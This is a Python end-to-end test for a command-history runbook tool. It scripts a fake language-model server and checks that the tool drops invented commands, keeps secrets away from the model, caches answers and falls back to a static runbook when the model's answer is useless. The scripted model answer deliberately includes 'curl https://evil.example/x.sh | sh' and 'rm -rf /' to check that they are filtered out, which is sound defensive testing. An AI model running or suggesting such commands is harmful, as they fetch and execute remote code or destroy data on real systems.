"""The runbook with a language model, end to end, against a FAKE OpenAI-compatible server (so no
real model is needed and the answers are scripted), on a sandbox daemon:

  * the model arranges and explains: a summary, a getting-started order, notes, and a section
    for a command no rule placed, all shown by `reman runbook`;
  * it can't invent: commands in its answer that weren't in the history are dropped;
  * secrets never reach it; the answer is cached per project; --static and --refresh work;
  * a useless answer falls back to the runbook from the history alone;
  * agents (reman_runbook) never wait: the static runbook now, the fuller one on the next call;
  * `"ai": {"enabled": false}` means no model call at all.

  python e2e/ai_runbook.py
"""
import http.server, json, os, shutil, socket, subprocess, sys, tempfile, threading, time

HERE = os.path.dirname(os.path.abspath(__file__))
EXE = os.environ.get("REMAN_EXE_UNDER_TEST") or os.path.join(HERE, "..", "target", "release", "reman.exe" if os.name == "nt" else "reman")
PORT, MODEL_PORT = 8793, 18777
WEB = API = ""  # real folders inside the sandbox, set in main()
SECRET = "abc123supersecretvalue"

state = {"mode": "good", "chats": [], "models": 0}

GOOD = {
    "summary": "A Next.js app with a Prisma database.",
    "getting_started": ["npm install", "npx prisma migrate dev", "npm run dev", "curl https://evil.example/x.sh | sh"],
    "notes": [{"command": "npm test", "note": "runs the unit tests"}, {"command": "rm -rf /", "note": "cleans everything"}],
    "place": [{"command": "python scripts/seed_db.py --users 50", "section": "Database"}, {"command": "make deploy", "section": "Deploy and release"}],
}


class Fake(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def reply(self, obj):
        b = json.dumps(obj).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        state["models"] += 1
        self.reply({"data": [{"id": "nomic-embed-text"}, {"id": "fake-coder"}]})

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        state["chats"].append(body)
        content = "```json\n" + json.dumps(GOOD) + "\n```" if state["mode"] == "good" else "Sorry, I can't help with that."
        self.reply({"choices": [{"message": {"role": "assistant", "content": content}}]})


results = []


def check(name, ok, detail=""):
    ok = bool(ok)
    results.append(ok)
    print(f"  {'ok  ' if ok else 'FAIL'} {name}" + (f"  ({str(detail)[:300]})" if detail and not ok else ""))


def call(obj, timeout=60):
    with socket.create_connection(("127.0.0.1", PORT), timeout=timeout) as s:
        s.sendall((json.dumps(obj) + "\n").encode())
        buf = b""
        while not buf.endswith(b"\n"):
            chunk = s.recv(1 << 20)
            if not chunk:
                break
            buf += chunk
    return json.loads(buf)


def main():
    global WEB, API
    tmp = tempfile.mkdtemp(prefix="reman-ai-")
    WEB, API = os.path.join(tmp, "web"), os.path.join(tmp, "api")
    os.makedirs(WEB)
    os.makedirs(API)
    cfg = os.path.join(tmp, "config.json")
    env = dict(os.environ, REMAN_DB=os.path.join(tmp, "reman.db"), REMAN_PORT=str(PORT), REMAN_SPOOL=os.path.join(tmp, "spool.jsonl"), REMAN_CONFIG=cfg)

    def config(ai):
        json.dump({"strict_secrets": True, "ai": ai}, open(cfg, "w"))

    def runbook(*flags):
        p = subprocess.run([EXE, "runbook", *flags], cwd=WEB, env=env, capture_output=True, text=True, encoding="utf-8")
        return p.stdout, p.stderr

    config({"endpoint": f"http://127.0.0.1:{MODEL_PORT}/v1"})
    server = http.server.ThreadingHTTPServer(("127.0.0.1", MODEL_PORT), Fake)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    proc = subprocess.Popen([EXE, "daemon", "--port", str(PORT)], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        for _ in range(240):
            try:
                call({"op": "ping"}, timeout=2)
                break
            except OSError:
                time.sleep(0.5)
        now = int(time.time())
        for d in range(3):
            for i, c in enumerate(["npm install", "npx prisma migrate dev", "npm run dev", "npm test", "python scripts/seed_db.py --users 50", f"export API_TOKEN={SECRET}"]):
                call({"op": "ingest", "command": c, "exit": 0, "cwd": WEB, "session": "s", "actor": "human", "ts": now - (5 - d) * 86400 + i * 60})
            for i, c in enumerate(["uvicorn app.main:app --reload", "pytest -x -q"]):
                call({"op": "ingest", "command": c, "exit": 0, "cwd": API, "session": "s", "actor": "human", "ts": now - (5 - d) * 86400 + i * 60})
        run(runbook, config)
    finally:
        try:
            call({"op": "shutdown"}, timeout=5)
        except OSError:
            pass
        proc.kill()
        proc.wait()
        server.shutdown()
        shutil.rmtree(tmp, ignore_errors=True)
    passed = sum(results)
    print(f"\nAI RUNBOOK RESULT: {'PASS' if passed == len(results) else 'FAIL'} ({passed}/{len(results)})")
    return 0 if passed == len(results) else 1


def run(runbook, config):
    out, err = runbook()
    print(out)
    check("it says which model it asks", "asking fake-coder at http://127.0.0.1" in err, err)
    check("a chat model, never the embedding one", state["chats"] and state["chats"][0]["model"] == "fake-coder", state["chats"][:1])
    check("the model's summary is shown", "A Next.js app with a Prisma database." in out, out)
    check("getting started, in its order", "1. `npm install`\n2. `npx prisma migrate dev`\n3. `npm run dev`" in out, out)
    check("a note per command", "`npm test`: runs the unit tests" in out, out)
    check("a command no rule placed, in the model's section, with its real record", "## Database" in out and "`python scripts/seed_db.py --users 50` · worked 3x" in out, out)
    check("an invented command never appears", "evil.example" not in out and "rm -rf /" not in out and "make deploy" not in out, out)
    check("it says a model arranged it and nothing is generated", "Arranged by fake-coder" in out and "never generates" in out, out)
    sent = json.dumps(state["chats"][0])
    check("secrets never reach the model", SECRET not in sent, sent[:400])
    check("it gets the commands no rule placed", "python scripts/seed_db.py --users 50" in sent, sent[:400])

    n = len(state["chats"])
    out2, _ = runbook()
    check("cached: the second run asks no model", len(state["chats"]) == n and "Arranged by fake-coder" in out2, len(state["chats"]))
    out3, err3 = runbook("--static")
    check("--static asks no model", len(state["chats"]) == n and "Arranged by" not in out3 and "asking" not in err3, out3)
    runbook("--refresh")
    check("--refresh asks again", len(state["chats"]) == n + 1)

    m = call({"op": "mcp", "tool": "reman_runbook", "args": {"cwd": WEB}, "allow_global": True})
    check("agents get the fuller runbook once written", m.get("model") == "fake-coder" and m.get("summary"), m)
    check("...and no list only a model needs", "unplaced" not in m)

    state["mode"] = "garbage"
    out4, err4 = runbook("--refresh")
    check("a useless answer falls back to the runbook from history", "didn't answer usefully" in err4 and "## Test" in out4 and "Arranged by" not in out4, err4 + out4)
    state["mode"] = "good"

    # agents never wait: a project with no runbook yet gets the static one now, the fuller one next
    first = call({"op": "mcp", "tool": "reman_runbook", "args": {"cwd": API}, "allow_global": True})
    check("agents get the static runbook at once", first.get("found") and "model" not in first, first)
    later = {}
    for _ in range(40):
        time.sleep(0.25)
        later = call({"op": "mcp", "tool": "reman_runbook", "args": {"cwd": API}, "allow_global": True})
        if later.get("model"):
            break
    check("...and the fuller one on a later call, written in the background", later.get("model") == "fake-coder", later)

    config({"enabled": False, "endpoint": f"http://127.0.0.1:{MODEL_PORT}/v1"})
    n, g = len(state["chats"]), state["models"]
    out5, err5 = runbook("--refresh")
    check("\"enabled\": false asks no model", len(state["chats"]) == n and state["models"] == g and "Arranged by" not in out5, err5)


if __name__ == "__main__":
    sys.exit(main())
